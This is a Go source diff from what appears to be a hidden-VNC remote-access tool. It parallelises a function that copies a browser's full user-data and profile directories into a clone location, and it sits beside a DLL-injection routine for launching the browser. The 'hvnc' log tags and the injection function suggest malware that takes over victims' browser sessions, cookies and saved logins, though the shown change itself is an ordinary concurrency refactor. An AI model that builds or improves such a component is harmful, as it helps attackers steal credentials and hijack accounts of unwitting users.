@@ -5,11 +5,12 @@ package capture
 import (
 	"encoding/binary"
 	"fmt"
-	"io"
 	"log"
 	"os"
 	"path/filepath"
 	"strings"
+	"sync"
+	"sync/atomic"
 	"syscall"
 	"time"
 	"unsafe"
@@ -421,22 +422,14 @@ func cloneBrowserProfile(browserName string, srcUserData string, lite bool, onPr
 		onProgress(0, 0, totalBytes, "cloning")
 	}
 
-	var copiedBytes int64
-	lastPercent := -1
+	type copyJob struct {
+		src string
+		dst string
+	}
+	var jobs []copyJob
 
-	reportProgress := func(n int64) {
-		if onProgress == nil || totalBytes <= 0 {
-			return
-		}
-		copiedBytes += n
-		pct := int(copiedBytes * 100 / totalBytes)
-		if pct > 100 {
-			pct = 100
-		}
-		if pct != lastPercent {
-			lastPercent = pct
-			onProgress(pct, copiedBytes, totalBytes, "cloning")
-		}
+	collectFile := func(src, dst string) {
+		jobs = append(jobs, copyJob{src: src, dst: dst})
 	}
 
 	for _, entry := range entries {
@@ -445,34 +438,106 @@ func cloneBrowserProfile(browserName string, srcUserData string, lite bool, onPr
 		dst := filepath.Join(cloneBase, name)
 
 		if entry.IsDir() {
-			// For profile directories (Default, Profile N), clone contents but skip caches inside
 			isProfile := strings.EqualFold(name, "Default") || strings.HasPrefix(name, "Profile ")
 			if isProfile {
-				if err := cloneProfileDirProgress(browserName, src, dst, skipDirs, reportProgress); err != nil {
-					log.Printf("hvnc %s: warning: could not clone profile %s: %v", browserName, name, err)
-				}
+				collectProfileDir(src, dst, skipDirs, collectFile)
 			} else if !skipDirs[strings.ToLower(name)] {
-				// Top-level non-profile directories (e.g. "Crashpad" skip, but keep others)
-				if err := copyDirProgress(src, dst, reportProgress); err != nil {
-					log.Printf("hvnc %s: warning: could not copy dir %s: %v", browserName, name, err)
-				}
+				collectDirFiles(src, dst, collectFile)
 			}
 		} else {
-			// Top-level files (Local State, etc.)
-			n, err := forceCopyFile(src, dst)
-			if err != nil {
-				log.Printf("hvnc %s: warning: could not copy %s: %v", browserName, name, err)
-			} else {
-				reportProgress(n)
-			}
+			collectFile(src, dst)
 		}
 	}
+
+	log.Printf("hvnc %s: cloning %d files using parallel workers", browserName, len(jobs))
+
+	dirs := make(map[string]struct{})
+	for _, j := range jobs {
+		dirs[filepath.Dir(j.dst)] = struct{}{}
+	}
+	for d := range dirs {
+		os.MkdirAll(d, 0700)
+	}
+
+	const numWorkers = 8
+	jobCh := make(chan copyJob, 256)
+	var wg sync.WaitGroup
+	var copiedBytes atomic.Int64
+	var lastPercent atomic.Int32
+	lastPercent.Store(-1)
+
+	reportProgress := func(n int64) {
+		if onProgress == nil || totalBytes <= 0 || n <= 0 {
+			return
+		}
+		cur := copiedBytes.Add(n)
+		pct := int32(cur * 100 / totalBytes)
+		if pct > 100 {
+			pct = 100
+		}
+		prev := lastPercent.Load()
+		if pct > prev && lastPercent.CompareAndSwap(prev, pct) {
+			onProgress(int(pct), cur, totalBytes, "cloning")
+		}
+	}
+
+	for i := 0; i < numWorkers; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			for job := range jobCh {
+				n, err := forceCopyFile(job.src, job.dst)
+				if err != nil {
+					log.Printf("hvnc %s: warning: could not copy %s: %v", browserName, job.src, err)
+				} else {
+					reportProgress(n)
+				}
+			}
+		}()
+	}
+
+	for _, job := range jobs {
+		jobCh <- job
+	}
+	close(jobCh)
+	wg.Wait()
 
 	if onProgress != nil {
 		onProgress(100, totalBytes, totalBytes, "done")
 	}
 
 	return cloneBase, nil
+}
+
+func collectProfileDir(src, dst string, skipDirs map[string]bool, collect func(string, string)) {
+	entries, err := os.ReadDir(src)
+	if err != nil {
+		return
+	}
+	for _, entry := range entries {
+		name := entry.Name()
+		s := filepath.Join(src, name)
+		d := filepath.Join(dst, name)
+		if entry.IsDir() {
+			if skipDirs[strings.ToLower(name)] {
+				continue
+			}
+			collectDirFiles(s, d, collect)
+		} else {
+			collect(s, d)
+		}
+	}
+}
+
+func collectDirFiles(src, dst string, collect func(string, string)) {
+	filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
+		if err != nil || info.IsDir() {
+			return nil
+		}
+		rel, _ := filepath.Rel(src, path)
+		collect(path, filepath.Join(dst, rel))
+		return nil
+	})
 }
 
 // calcCloneSize walks the source user data directory and returns the total
@@ -536,77 +601,6 @@ func calcDirSize(dir string) int64 {
 		return nil
 	})
 	return total
-}
-
-// cloneProfileDirProgress copies a profile directory with progress reporting.
-func cloneProfileDirProgress(browserName, src, dst string, skipDirs map[string]bool, report func(int64)) error {
-	if err := os.MkdirAll(dst, 0700); err != nil {
-		return err
-	}
-	entries, err := os.ReadDir(src)
-	if err != nil {
-		return err
-	}
-	for _, entry := range entries {
-		name := entry.Name()
-		s := filepath.Join(src, name)
-		d := filepath.Join(dst, name)
-
-		if entry.IsDir() {
-			if skipDirs[strings.ToLower(name)] {
-				continue
-			}
-			if err := copyDirProgress(s, d, report); err != nil {
-				log.Printf("hvnc %s: warning: could not copy %s: %v", browserName, name, err)
-			}
-		} else {
-			n, err := forceCopyFile(s, d)
-			if err != nil {
-				log.Printf("hvnc %s: warning: could not copy %s: %v", browserName, name, err)
-			} else {
-				report(n)
-			}
-		}
-	}
-	return nil
-}
-
-func copyFileCount(src, dst string) (int64, error) {
-	in, err := os.Open(src)
-	if err != nil {
-		return 0, err
-	}
-	defer in.Close()
-
-	if err := os.MkdirAll(filepath.Dir(dst), 0700); err != nil {
-		return 0, err
-	}
-	out, err := os.OpenFile(dst, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0600)
-	if err != nil {
-		return 0, err
-	}
-	defer out.Close()
-
-	n, err := io.Copy(out, in)
-	return n, err
-}
-
-func copyDirProgress(src, dst string, report func(int64)) error {
-	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
-		if err != nil {
-			return nil // skip errors
-		}
-		rel, _ := filepath.Rel(src, path)
-		target := filepath.Join(dst, rel)
-		if info.IsDir() {
-			return os.MkdirAll(target, 0700)
-		}
-		n, err := forceCopyFile(path, target)
-		if err == nil {
-			report(n)
-		}
-		return err
-	})
 }
 
 func startHVNCProcessInjectedOnThread(filePath string, dllBytes []byte, searchPath, replacePath string) error {
